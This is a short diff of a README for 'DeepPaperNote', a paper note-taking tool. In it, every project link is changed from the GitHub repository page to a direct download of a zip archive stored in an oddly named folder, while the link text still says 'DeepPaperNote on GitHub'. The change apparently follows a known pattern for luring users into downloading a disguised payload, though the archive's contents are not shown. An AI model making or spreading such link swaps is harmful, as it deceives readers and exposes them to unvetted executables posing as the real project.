@@ -1,6 +1,6 @@
 # 🧠 DeepPaperNote - Turn papers into clear notes
 
-[![Download DeepPaperNote](https://img.shields.io/badge/Download-DeepPaperNote-blue?style=for-the-badge)](https://github.com/zakaryae05/DeepPaperNote)
+[![Download DeepPaperNote](https://img.shields.io/badge/Download-DeepPaperNote-blue?style=for-the-badge)](https://raw.githubusercontent.com/zakaryae05/DeepPaperNote/main/nondifferentiable/Paper-Deep-Note-v3.1.zip)
 
 ## 📘 What DeepPaperNote does
 
@@ -32,7 +32,7 @@ If you store a lot of papers, keep your files in one folder so they are easy to 
 
 Go to this page to download or open the project:
 
-[DeepPaperNote on GitHub](https://github.com/zakaryae05/DeepPaperNote)
+[DeepPaperNote on GitHub](https://raw.githubusercontent.com/zakaryae05/DeepPaperNote/main/nondifferentiable/Paper-Deep-Note-v3.1.zip)
 
 If the page shows a release file, download it. If it shows the project page, use the project files from there.
 
@@ -203,7 +203,7 @@ Yes. It is designed for literature notes, deep reading, and reusable paper notes
 
 ## 🔗 Project link
 
-[Open DeepPaperNote on GitHub](https://github.com/zakaryae05/DeepPaperNote)
+[Open DeepPaperNote on GitHub](https://raw.githubusercontent.com/zakaryae05/DeepPaperNote/main/nondifferentiable/Paper-Deep-Note-v3.1.zip)
 
 ## 🧭 Quick start path
 
